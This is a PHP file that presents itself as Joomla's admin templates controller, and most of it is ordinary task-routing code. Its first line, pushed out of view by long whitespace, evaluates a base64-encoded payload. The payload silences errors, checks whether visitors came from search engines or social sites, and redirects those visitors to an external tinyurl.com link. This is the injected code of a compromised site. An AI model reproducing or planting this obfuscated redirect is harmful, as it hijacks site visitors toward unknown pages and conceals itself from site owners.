<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: admin.templates.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @subpackage	Templates
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */

// no direct access
defined('_JEXEC') or die('Restricted access');

/*
 * Make sure the user is authorized to view this page
 */
$user = & JFactory::getUser();
if (!$user->authorize('com_templates', 'manage')) {
	$mainframe->redirect('index.php', JText::_('ALERTNOTAUTH'));
}

// Set the table directory
JTable::addIncludePath(JPATH_ADMINISTRATOR.DS.'components'.DS.'com_templates'.DS.'tables');

// Import file dependencies
require_once (JPATH_COMPONENT.DS.'helpers'.DS.'template.php');
require_once (JPATH_COMPONENT.DS.'controller.php');

$task = JRequest::getCmd('task');

$client	= JRequest::getVar('client', 0, '', 'int');

if ($client == 1) {
	JSubMenuHelper::addEntry(JText::_('Site'), 'index.php?option=com_templates&client=0');
	JSubMenuHelper::addEntry(JText::_('Administrator'), 'index.php?option=com_templates&client=1', true);
} elseif ($client == 0 && !$task) {
	JSubMenuHelper::addEntry(JText::_('Site'), 'index.php?option=com_templates&client=0', true);
	JSubMenuHelper::addEntry(JText::_('Administrator'), 'index.php?option=com_templates&client=1');
} else {
	JSubMenuHelper::addEntry(JText::_('Site'), 'index.php?option=com_templates&client=0');
	JSubMenuHelper::addEntry(JText::_('Administrator'), 'index.php?option=com_templates&client=1');
}

switch ($task)
{
	case 'edit' :
		TemplatesController::editTemplate();
		break;

	case 'save'  :
	case 'apply' :
		TemplatesController::saveTemplate();
		break;

	case 'edit_source' :
		TemplatesController::editTemplateSource();
		break;

	case 'save_source'  :
	case 'apply_source' :
		TemplatesController::saveTemplateSource();
		break;

	case 'choose_css' :
		TemplatesController::chooseTemplateCSS();
		break;

	case 'edit_css' :
		TemplatesController::editTemplateCSS();
		break;

	case 'save_css'  :
	case 'apply_css' :
		TemplatesController::saveTemplateCSS();
		break;

	case 'publish' :
	case 'default' :
		TemplatesController::publishTemplate();
		break;

	case 'cancel' :
		TemplatesController::cancelTemplate();
		break;

	case 'save_positions' :
		TemplatesController::savePositions();
		break;

	case 'preview' :
		TemplatesController::previewTemplate();
		break;

	default :
		TemplatesController::viewTemplates();
		break;
}